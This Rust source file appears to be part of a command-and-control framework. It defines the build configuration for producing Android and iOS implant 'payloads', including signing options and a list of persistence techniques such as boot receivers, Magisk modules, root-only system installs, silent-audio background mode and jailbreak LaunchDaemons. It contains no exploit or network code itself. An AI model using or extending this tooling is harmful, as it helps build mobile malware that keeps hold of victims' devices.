//! Mobile platform build pipeline extension.
//!
#![allow(dead_code)]
#![allow(unused)]

//! Extends the Orchestra builder to support Android APK/AAR and iOS IPA/.a
//! artifact generation.  Provides the configuration types and build worker
//! dispatch for mobile payload production from the C2 server build queue.

use serde::{Deserialize, Serialize};

/// Target mobile platform for payload generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MobilePlatform {
    /// Android (aarch64-linux-android, x86_64-linux-android)
    Android,
    /// iOS (aarch64-apple-ios)
    #[serde(rename = "ios")]
    Ios,
}

/// Mobile CPU architecture.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MobileArch {
    /// 64-bit ARM (arm64-v8a / aarch64)
    Arm64,
    /// 64-bit x86 (x86_64, for Android emulator)
    X86_64,
}

impl MobileArch {
    /// Rust target triple for this architecture on Android.
    pub fn android_target_triple(self) -> &'static str {
        match self {
            MobileArch::Arm64 => "aarch64-linux-android",
            MobileArch::X86_64 => "x86_64-linux-android",
        }
    }

    /// Rust target triple for this architecture on iOS.
    pub fn ios_target_triple(self) -> &'static str {
        match self {
            MobileArch::Arm64 => "aarch64-apple-ios",
            MobileArch::X86_64 => "aarch64-apple-ios-sim",
        }
    }

    /// Android JNI libs directory name.
    pub fn android_jnilibs_dir(self) -> &'static str {
        match self {
            MobileArch::Arm64 => "arm64-v8a",
            MobileArch::X86_64 => "x86_64",
        }
    }
}

/// Type of mobile artifact to produce.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MobilePackageType {
    /// Full Android APK (includes Java wrapper + .so)
    Apk,
    /// Standalone shared library (.so) for existing Android apps
    So,
    /// Full iOS IPA (includes Swift wrapper + .a)
    Ipa,
    /// Standalone static library (.a) for linking into Xcode projects
    StaticLib,
}

/// Android-specific build configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AndroidBuildConfig {
    /// Application package name (e.g., "com.example.app")
    pub package_name: String,
    /// Display name shown in launcher/app info
    pub app_name: String,
    /// Minimum Android SDK level (default: 26 = Android 8.0)
    #[serde(default = "default_min_sdk")]
    pub min_sdk: u32,
    /// Target Android SDK level (default: 34)
    #[serde(default = "default_target_sdk")]
    pub target_sdk: u32,
    /// Path to keystore for APK signing
    pub keystore_path: Option<std::path::PathBuf>,
    /// Keystore password
    pub keystore_password: Option<String>,
    /// Android permissions to include in the manifest
    #[serde(default)]
    pub permissions: Vec<String>,
    /// Persistence method to bake into the APK
    pub persistence_method: Option<AndroidPersistenceMethod>,
}

fn default_min_sdk() -> u32 {
    26
}

fn default_target_sdk() -> u32 {
    34
}

/// Android persistence strategy options.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum AndroidPersistenceMethod {
    /// Foreground service only (survives background, not reboot)
    ForegroundService,
    /// Foreground service + BOOT_COMPLETED receiver
    BootReceiver,
    /// Foreground service + WorkManager periodic check-in
    WorkManager,
    /// Init.d script (requires root)
    InitD,
    /// Magisk module (requires Magisk)
    MagiskModule,
    /// System app installation (requires root)
    SystemApp,
}

/// iOS-specific build configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IosBuildConfig {
    /// Bundle identifier (e.g., "com.example.agent")
    pub bundle_id: String,
    /// Apple Developer Team ID for code signing
    pub team_id: String,
    /// Path to provisioning profile (.mobileprovision)
    pub provisioning_profile_path: Option<std::path::PathBuf>,
    /// Path to entitlements plist
    pub entitlements_path: Option<std::path::PathBuf>,
    /// Persistence method to bake into the IPA
    pub persistence_method: Option<IosPersistenceMethod>,
}

/// iOS persistence strategy options.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum IosPersistenceMethod {
    /// Background fetch (UIBackgroundModes fetch)
    BackgroundFetch,
    /// Background processing task (BGProcessingTask)
    BGProcessingTask,
    /// Silent push notifications (APNs)
    SilentPush,
    /// Significant location changes
    SignificantLocation,
    /// VoIP push (requires VoIP entitlement)
    VoipPush,
    /// Audio background mode (play silent audio)
    AudioBackground,
    /// LaunchDaemon (requires jailbreak)
    LaunchDaemon,
    /// LaunchAgent (requires jailbreak)
    LaunchAgent,
}

/// Complete mobile build configuration.
///
/// This is the top-level config object passed to the builder when targeting
/// a mobile platform.  It is serialized as part of the build request JSON.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MobileConfig {
    /// Target mobile platform
    pub platform: MobilePlatform,
    /// CPU architectures to build for
    pub arch: Vec<MobileArch>,
    /// Type of artifact to produce
    pub package_type: MobilePackageType,
    /// Android-specific options (required when platform=Android)
    pub android_config: Option<AndroidBuildConfig>,
    /// iOS-specific options (required when platform=IOS)
    pub ios_config: Option<IosBuildConfig>,
}

impl MobileConfig {
    /// Validate that the configuration is internally consistent.
    pub fn validate(&self) -> Result<(), String> {
        if self.arch.is_empty() {
            return Err("At least one architecture must be specified".into());
        }
        match self.platform {
            MobilePlatform::Android => {
                if self.android_config.is_none() {
                    return Err("android_config is required when platform=Android".into());
                }
            }
            MobilePlatform::Ios => {
                if self.ios_config.is_none() {
                    return Err("ios_config is required when platform=iOS".into());
                }
            }
        }
        Ok(())
    }

    /// Return the Rust target triples for this configuration.
    pub fn target_triples(&self) -> Vec<&'static str> {
        self.arch
            .iter()
            .map(|a| match self.platform {
                MobilePlatform::Android => a.android_target_triple(),
                MobilePlatform::Ios => a.ios_target_triple(),
            })
            .collect()
    }

    /// Return the recommended output filename for this artifact.
    pub fn output_filename(&self) -> &'static str {
        match self.package_type {
            MobilePackageType::Apk => "agent.apk",
            MobilePackageType::So => "liborchestra.so",
            MobilePackageType::Ipa => "agent.ipa",
            MobilePackageType::StaticLib => "liborchestra.a",
        }
    }

    /// Return the MIME type for the built artifact.
    pub fn output_mime_type(&self) -> &'static str {
        match self.package_type {
            MobilePackageType::Apk => "application/vnd.android.package-archive",
            MobilePackageType::So => "application/octet-stream",
            MobilePackageType::Ipa => "application/octet-stream",
            MobilePackageType::StaticLib => "application/octet-stream",
        }
    }
}

/// Mobile build result returned by the build worker.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MobileBuildResult {
    /// Path to the final artifact
    pub artifact_path: String,
    /// Artifact size in bytes
    pub size_bytes: u64,
    /// SHA-256 hash of the artifact
    pub sha256: String,
    /// Target triple used for compilation
    pub target_triple: String,
    /// Cargo features enabled during build
    pub features: Vec<String>,
    /// Duration of the build in seconds
    pub build_duration_secs: f64,
}
